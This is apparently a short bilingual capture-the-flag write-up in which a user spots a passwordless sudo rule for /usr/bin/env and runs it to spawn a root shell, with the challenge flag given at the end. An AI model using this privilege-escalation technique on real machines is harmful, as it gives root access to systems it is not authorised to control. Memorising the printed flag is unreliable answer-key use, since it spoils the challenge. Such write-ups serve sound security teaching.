# Operation Dark Sabotage 2

## Write-up FR

On remarque que l'on peut exécuter des commandes en tant que `root` avec `sudo` :
```bash
$ sudo -l
Matching Defaults entries for x-wings on c3246ecf1a97:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User x-wings may run the following commands on c3246ecf1a97:
    (root) NOPASSWD: /usr/bin/env
```

Puisque nous avons l'autorisation d'exécuter `/usr/bin/env` en tant que `root` sans mot de passe, nous pouvons l'utiliser pour obtenir un shell `root` :
```bash
$ sudo /usr/bin/env /bin/bash
# whoami 
root
```

## Write-up EN

We notice that we can execute commands as `root` using `sudo` :
```bash
$ sudo -l
Matching Defaults entries for x-wings on c3246ecf1a97:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User x-wings may run the following commands on c3246ecf1a97:
    (root) NOPASSWD: /usr/bin/env
```
Since we have permission to run `/usr/bin/env` as `root` without a password, we can use it to spawn a `root` shell :
```bash
$ sudo /usr/bin/env /bin/bash
# whoami 
root
```

## Flag

`polycyber{d3str0y_th3_xw1ngs}`